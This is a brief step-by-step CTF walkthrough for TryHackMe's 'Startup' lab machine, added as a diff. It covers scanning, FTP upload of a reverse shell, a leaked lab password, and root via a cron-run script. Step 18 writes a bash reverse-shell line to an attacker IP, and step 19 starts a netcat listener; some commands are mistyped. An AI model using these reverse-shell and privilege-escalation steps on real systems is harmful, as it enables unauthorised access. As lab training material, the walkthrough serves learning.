@@ -1,0 +1,22 @@
+                                                                                                                          This is a walkthrough of how how solved the Startup CTF on TryHackMe 
+
+1. Connect With the TryHackMe server using Command  $ sudo openvpn Downloads/Ynos.ovpn
+2. Confirm You can Connect to the Machine using the command $ ping (Ip of the machine)
+3. Start the nmap scan with $ nmap -sV -O -T5 -p- 10.10.207.53 -oN Nmap.results
+4. Nmap results show that the ftp server is open on this device 
+5. While scanning this start dirbusting the website and you will find a directories named files and here you find among us memes and a hint of user named maya
+6. The files of these can be accessed both through the website and ftp server
+7. As there are no other weak points we will start by uploading the reverse-shell file on this server and then running it to gain access
+8. You get acces of the data user from here 
+9. While enumerating you will find the special ingredient and a hint of a user named lennie 
+10. And a file named suspicious.pcapng
+11. Enumerating this file we get access to the user lenni's pass i.e- c4ntg3t3n0ughsp1c3
+12. We use ssh to gain the access of lennie 
+13. Here we find the second flag 
+14. Now we try to check the crontab of lennie or root ( services that are set to run on perodic intervals are registered on contab )
+15. As we cannot gain access to this crontab we download the pspy64 for unprivilege process snoping 
+16.So we upload the file on ftp server and download it on lennie's comp and  
+17.  Find out that a process of lennie's is running on a perodic time of 1 minutes 
+18. So we paste the bash reverse shell command on lenni's machine using the command $echo ‘bash -i >& /dev/tcp/10.23.132.255/4242’ > etc/print.sh 
+19. And start netcat in another termianl using command $ nc -nclp 4242 
+20. And in under a minute we will gain access to the root user 
